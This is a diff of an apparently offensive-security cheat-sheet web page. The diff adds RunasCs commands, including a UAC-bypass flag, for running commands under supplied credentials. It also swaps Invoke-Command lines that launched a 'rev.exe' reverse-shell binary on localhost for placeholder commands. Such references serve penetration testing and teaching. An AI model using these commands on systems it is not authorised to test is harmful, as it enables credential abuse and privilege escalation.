@@ -320,9 +320,23 @@ body.dark-mode #dynamicFormContainer button:hover {
     background: #424242;
 }
 </style>
-  <h3 id="create-credential-object">Create credential object</h3>
+  <h3 id="runascs">RunasCS</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\RunasCs.exe &#39;&lt;USER&gt;&#39; &#39;&lt;PASSWORD&gt;&#39; &#34;&lt;CMD&gt;&#34; -l &lt;LOGON_TYPE&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Or
+</span></span><span class="line"><span class="cl"><span class="go">.\RunasCs.exe &#39;&lt;USER&gt;&#39; &#39;&lt;PASSWORD&gt;&#39; --bypass-uac &#34;&lt;CMD&gt;&#34; -l &lt;LOGON_TYPE&gt;
+</span></span></span></code></pre></div><br>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">2  Interactive
+</span></span></span><span class="line"><span class="cl"><span class="go">3  Network
+</span></span></span><span class="line"><span class="cl"><span class="go">4  Batch
+</span></span></span><span class="line"><span class="cl"><span class="go">5  Service
+</span></span></span><span class="line"><span class="cl"><span class="go">7  Unlock
+</span></span></span><span class="line"><span class="cl"><span class="go">8  NetworkCleartext
+</span></span></span><span class="line"><span class="cl"><span class="go">9  NewCredentials
+</span></span></span><span class="line"><span class="cl"><span class="go">10 RemoteInteractive
+</span></span></span><span class="line"><span class="cl"><span class="go">11 CachedInteractive
+</span></span></span></code></pre></div><h3 id="create-credential-object">Create credential object</h3>
 <p>
-<button data-tabset="set1" data-tabcontent="tab1" class="active">Method #1</button>
+<button data-tabset="set1" data-tabcontent="tab1" >Method #1</button>
 
 <button data-tabset="set1" data-tabcontent="tab2" >Method #2</button>
 
@@ -339,15 +353,16 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></code></pre></div></div></p>
 <h3 id="runas-with-cred-object">Runas (with cred object)</h3>
 <p>
-<button data-tabset="set2" data-tabcontent="tab1" class="active">Invoke-Command</button>
+<button data-tabset="set2" data-tabcontent="tab1" >Invoke-Command</button>
 
 <button data-tabset="set2" data-tabcontent="tab2" >PSSession</button>
 
-<div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Computer localhost
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Set computer to localhost <span class="k">if</span> running locally
+</span></span><span class="line"><span class="cl"><span class="go">Invoke-Command -ScriptBlock { &lt;CMD&gt; } -Credential $cred -Computer &lt;COMPUTER_NAME&gt;
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> If error, try
-</span></span><span class="line"><span class="cl"><span class="go">Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Computer localhost -auth credssp
+</span></span><span class="line"><span class="cl"><span class="go">Invoke-Command -ScriptBlock { &lt;CMD&gt; } -Credential $cred -Computer &lt;COMPUTER_NAME&gt; -auth credssp
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Invoke <span class="nb">command</span> with config
-</span></span><span class="line"><span class="cl"><span class="go">Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Computer localhost -ConfigurationName config_name
+</span></span><span class="line"><span class="cl"><span class="go">Invoke-Command -ScriptBlock { &lt;CMD&gt; } -Credential $cred -Computer &lt;COMPUTER_NAME&gt; -ConfigurationName config_name
 </span></span></span></code></pre></div></div>
 
 <div class="tabcontent" data-tabset="set2" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">new-pssession -computername . -credential $cred
